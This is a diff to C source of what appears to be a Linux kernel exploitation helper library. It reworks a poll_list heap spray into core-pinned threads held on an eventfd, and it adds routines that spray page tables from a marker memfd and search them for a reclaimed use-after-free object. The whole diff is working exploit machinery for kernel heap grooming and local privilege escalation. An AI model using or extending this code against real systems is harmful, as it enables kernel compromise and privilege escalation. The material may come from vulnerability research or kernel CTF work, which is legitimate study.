@@ -5,10 +5,13 @@
 #include <fcntl.h>
 #include <linux/keyctl.h>
 #include <pthread.h>
+#include <stdatomic.h>
 #include <stdbool.h>
 #include <stdint.h>
+#include <sys/eventfd.h>
 #include <sys/mman.h>
 #include <sys/msg.h>
+#include <sys/poll.h>
 #include <sys/shm.h>
 #include <sys/socket.h>
 #include <sys/syscall.h>
@@ -24,14 +27,21 @@ int g_seq_ops[0x10000];
 int g_ptmx[0x1000];
 int g_fds[0x1000];
 int g_tfds[0x1000];
-pthread_t g_poll_tids[0x1000];
 int g_n_keys;
 
-static int poll_threads;
-static pthread_mutex_t poll_mutex = PTHREAD_MUTEX_INITIALIZER;
+atomic_uint g_polls_ready;
+atomic_uint g_polls_done;
+
+typedef struct {
+    int wake_fd;
+    size_t alloc_sz;
+} held_poll_arg_t;
+
+pthread_t g_poll_threads[0x1000];
+held_poll_arg_t g_poll_args[0x1000];
 
 // kmalloc-1k
-void alloc_tty(int i) {
+void alloc_tty(size_t i) {
     g_ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
 
     if (g_ptmx[i] < 0) {
@@ -39,7 +49,7 @@ void alloc_tty(int i) {
     }
 }
 
-void free_tty(int i) {
+void free_tty(size_t i) {
     if (close(g_ptmx[i]) < 0) {
         errExit("[X] free tty");
     }
@@ -294,10 +304,12 @@ void free_file(int i) {
 
 static int randint(int min, int max) { return min + (rand() % (max - min)); }
 
-unsigned poll_fds_to_alloc(size_t sz) {
-    // stuff allocated on stack (inside stack_pps buf)
-    unsigned to_alloc =
-        (STACK_PPS_SZ - sizeof(poll_list_t)) / sizeof(struct pollfd);
+#define POLL_STACK_ALLOC 0x100
+size_t poll_fds_to_alloc(size_t sz) {
+    // Some poll descriptor are kept on syscall stack:
+    // https://github.com/torvalds/linux/blob/e22254e9ddd8020130c4b806b6b4aa77b09c2560/fs/select.c#L982
+    size_t to_alloc =
+        (POLL_STACK_ALLOC - sizeof(poll_list_t)) / sizeof(struct pollfd);
 
     // subtract size needed for poll_list struct
     if (sz % PAGE_SIZE == 0) {
@@ -311,62 +323,57 @@ unsigned poll_fds_to_alloc(size_t sz) {
     return to_alloc;
 }
 
-void *spray_poll_list(void *args) {
-    thread_args_t *ta = (thread_args_t *)args;
-    int ret;
+static void *hold_poll_object(void *opaque) {
+    held_poll_arg_t *arg = opaque;
 
-    struct pollfd *pollers = calloc(ta->amt, sizeof(struct pollfd));
+    size_t poll_fd_cnt = poll_fds_to_alloc(arg->alloc_sz);
+    struct pollfd *descriptors = calloc(poll_fd_cnt, sizeof(struct pollfd));
 
-    for (unsigned i = 0; i < ta->amt; i++) {
-        pollers[i].fd = ta->fd_read;
-        pollers[i].events = POLLERR;
+    // ensure the sprayed objects are managed by core 0
+    assign_thread_to_core(0);
+
+    for (unsigned i = 0; i < poll_fd_cnt; i++) {
+        /* Negative fds are ignored; one shared eventfd keeps poll blocked. */
+        descriptors[i].fd = -1;
+        descriptors[i].events = POLLIN;
+        descriptors[i].revents = 0;
+    }
+    // this keeps the poll blocked
+    descriptors[0].fd = arg->wake_fd;
+
+    atomic_fetch_add_explicit(&g_polls_ready, 1, memory_order_release);
+    if (poll(descriptors, poll_fd_cnt, -1) < 0) {
+        errExit("held poll");
     }
 
-    assign_thread_to_core(0x0);
+    // kmalloc object has been freed
+    atomic_fetch_add_explicit(&g_polls_done, 1, memory_order_release);
 
-    pthread_mutex_lock(&poll_mutex);
-    poll_threads++;
-    pthread_mutex_unlock(&poll_mutex);
-
-    ret = poll(pollers, ta->amt, ta->timeout);
-    if (ret < 0) {
-        errExit("poll");
-    }
-
-    assign_thread_to_core(randint(0x1, 0x3));
-
-    if (ta->suspend) {
-        pthread_mutex_lock(&poll_mutex);
-        poll_threads--;
-        pthread_mutex_unlock(&poll_mutex);
-
-        while (1) {
-        };
-    }
-
-    return NULL;
-}
-
-void create_poll_thread(int i, thread_args_t *args) {
-    int ret;
-
-    ret = pthread_create(&g_poll_tids[i], 0, spray_poll_list, (void *)args);
-    if (ret != 0) {
-        errExit("pthread_create");
+    /*
+     * Keep this task alive after poll() frees its poll_list.  Returning from
+     * many threads here would add task/stack teardown allocations and frees
+     * to the allocator state while the victim slab is being reclaimed.
+     * pause() consumes no CPU, and the loop tolerates an incidental signal.
+     */
+    for (;;) {
+        pause();
     }
 }
 
-void join_poll_threads(void) {
-    int ret;
-    for (int i = 0; i < poll_threads; i++) {
-        ret = pthread_join(g_poll_tids[i], NULL);
+void spray_poll_list(size_t i, size_t sz, int wake_fd) {
+    g_poll_args[i].wake_fd = wake_fd;
+    g_poll_args[i].alloc_sz = sz;
 
-        if (ret < 0) {
-            errExit("pthread_join");
-        }
-        open("/proc/self/stat", O_RDONLY);
+    if (pthread_create(&g_poll_threads[i], NULL, hold_poll_object,
+                       &g_poll_args[i])) {
+        errExit("pthread_create held poll");
     }
-    poll_threads = 0x0;
+}
+
+void free_poll_lists(int wake_fd) {
+    if (eventfd_write(wake_fd, 1) < 0) {
+        errExit("eventfd_write");
+    }
 }
 
 // TODO: need to check this for the specific kernel. struct has changed quite
@@ -459,15 +466,99 @@ void free_xattr(char *path, int i, size_t name_len) {
     }
 }
 
+int create_marker_file(void) {
+    int fd = memfd_create("pte-marker", MFD_CLOEXEC);
+    unsigned char *mapping;
+
+    if (fd < 0 || ftruncate(fd, PD_MAPPING_SIZE)) {
+        errExit("create PTE marker file");
+    }
+    mapping =
+        mmap(NULL, PD_MAPPING_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (mapping == MAP_FAILED) {
+        errExit("mmap PTE marker file");
+    }
+
+    // A's as marker
+    memset(mapping, 0x41, PD_MAPPING_SIZE);
+
+    return fd;
+}
+
+void map_marker_vmas(unsigned first, unsigned count, int marker_fd) {
+    for (unsigned i = first; i < first + count; i++) {
+        void *address = PTI_TO_VIRT(3, 0, i, 0);
+
+        if (mmap(address, PD_MAPPING_SIZE, PROT_READ, MAP_SHARED | MAP_FIXED,
+                 marker_fd, 0) == MAP_FAILED) {
+            errExit("map page-table spray VMA");
+        }
+    }
+}
+
+// touch all locations within a page, where the uafed object may begin, causing
+// PTEs to be created at that address
+//
+// **NOTE**: this requires the mapped region / file to be at least 2 MiB else
+// SIGBUS is thrown when trying to access a page beyond EOF
+void fault_marker_slots(unsigned start, unsigned len, size_t uafed_obj_size) {
+    for (unsigned i = start; i < start + len; ++i) {
+        unsigned pte_index_stride = uafed_obj_size / sizeof(uint64_t);
+        unsigned uafed_objs_per_page = PAGE_SIZE / uafed_obj_size;
+        for (unsigned slot = 0; slot < uafed_objs_per_page; ++slot) {
+            uint64_t *addr = PTI_TO_VIRT(3, 0, i, slot * pte_index_stride);
+            volatile uint64_t touch = *addr;
+        }
+    }
+}
+
+// return address of mapped region matching needle
+uint8_t *search_marker_slots(unsigned start, unsigned len,
+                             size_t uafed_obj_size, uint8_t *needle,
+                             size_t needle_sz) {
+    for (unsigned i = start; i < start + len; ++i) {
+        unsigned pte_index_stride = uafed_obj_size / sizeof(uint64_t);
+        unsigned uafed_objs_per_page = PAGE_SIZE / uafed_obj_size;
+        for (unsigned slot = 0; slot < uafed_objs_per_page; ++slot) {
+            uint8_t *addr = PTI_TO_VIRT(3, 0, i, slot * pte_index_stride);
+            if (memcmp(addr, needle, needle_sz) == 0) {
+                return addr;
+            }
+        }
+    }
+
+    return NULL;
+}
+
+// return address of mapped region not matching needle
+uint8_t *search_marker_slots_negative(unsigned start, unsigned len,
+                                      size_t uafed_obj_size, uint8_t *needle,
+                                      size_t needle_sz) {
+    for (unsigned i = start; i < start + len; ++i) {
+        unsigned pte_index_stride = uafed_obj_size / sizeof(uint64_t);
+        unsigned uafed_objs_per_page = PAGE_SIZE / uafed_obj_size;
+        for (unsigned slot = 0; slot < uafed_objs_per_page; ++slot) {
+            uint8_t *addr = PTI_TO_VIRT(3, 0, i, slot * pte_index_stride);
+            if (memcmp(addr, needle, needle_sz) != 0) {
+                return addr;
+            }
+        }
+    }
+
+    return NULL;
+}
+
 // spray file backed page tables
 void spray_pt_fd(unsigned start, unsigned len, int fd) {
     for (unsigned i = start; i < start + len; ++i) {
-        uint64_t *p = mmap(PTI_TO_VIRT(3, 0, i, 0), PAGE_SIZE, PROT_READ,
-                           MAP_SHARED | MAP_FIXED, fd, 0);
+        void *addr = PTI_TO_VIRT(3, 0, i, 0);
+        uint64_t *p =
+            mmap(addr, PAGE_SIZE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0);
         if (p == MAP_FAILED) {
             errExit("mmap failed");
         }
 
+        // trigger allocation of page directory table
         volatile uint64_t touch = *p;
     }
 }
